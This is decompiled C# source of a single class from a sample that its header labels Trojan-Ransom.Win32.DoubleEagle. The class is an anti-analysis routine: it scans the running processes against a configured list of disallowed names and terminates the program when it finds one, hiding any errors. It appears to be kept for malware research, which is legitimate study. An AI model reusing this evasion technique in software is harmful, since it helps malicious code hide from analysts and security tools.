// Decompiled with JetBrains decompiler
// Type: a.CheckProcesses
// Assembly: a, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F9E5355F-B81F-44C3-B871-657587613D56
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.DoubleEagle.oy-d5b498f54e9295f6ea542e3d341d03f3f4f4c5d98da494db89d0d61eb31c41a2.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace a
{
  [StandardModule]
  internal sealed class CheckProcesses
  {
    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void Check()
    {
      if (Config.Debug)
        return;
      try
      {
        Process[] processes = Process.GetProcesses();
        ListBox listBox = new ListBox();
        int index1 = 0;
        while (index1 != checked (processes.Length - 1))
        {
          listBox.Items.Add((object) processes[index1].ProcessName.ToLower());
          checked { ++index1; }
        }
        int index2 = 0;
        int index3 = 0;
        while (index2 != Config.ProsNotAllowed.Items.Count)
        {
          while (index3 != listBox.Items.Count)
          {
            if (listBox.Items[index3].ToString().Contains(Conversions.ToString(Config.ProsNotAllowed.Items[index2])))
              ProjectData.EndApp();
            checked { ++index3; }
          }
          index3 = 0;
          checked { ++index2; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
